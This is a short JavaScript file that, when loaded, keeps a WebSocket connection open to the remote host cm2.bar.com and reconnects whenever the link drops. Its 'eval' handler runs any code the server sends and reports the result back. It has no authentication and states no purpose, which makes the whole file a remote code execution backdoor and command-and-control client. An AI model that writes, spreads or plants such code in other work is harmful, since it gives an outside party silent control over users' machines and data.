// Initialize global variables and functions
globalThis.serverName = 'default';
globalThis.lastPing = Date.now();

// Function to send messages over WebSocket
const sendMessage = (socket, message) => socket.send(JSON.stringify(message));

const pingCommand = (_, socket) => {
  globalThis.lastPing = Date.now();
  sendMessage(socket, { type: "pong" });
};

const evalCommand = ({ code }, socket) => {
  const returned = eval(code); // Execute the code sent from the server on the client's machine
  sendMessage(socket, { type: "evaled", returned: `${returned}` });
};

globalThis.commands = {
  eval: evalCommand,
  ping: pingCommand,
};

// Initialize WebSocket connection
globalThis.start ??= () => {
  if (globalThis.socket) {
    return;
  }

  const socket = new WebSocket(`ws://cm2.bar.com:8765/`);
  globalThis.socket = socket;

  const closed = () => {
    globalThis.socket = undefined;
    setTimeout(() => globalThis.start(), 500)
  };
  socket.onclose = closed;
  socket.onerror = closed;
  socket.onmessage = ({ data }) => {
    if (!data) return;

    const { type, ...rest } = JSON.parse(data);
    globalThis.commands[type]?.(rest, socket);
};
};

globalThis.start();
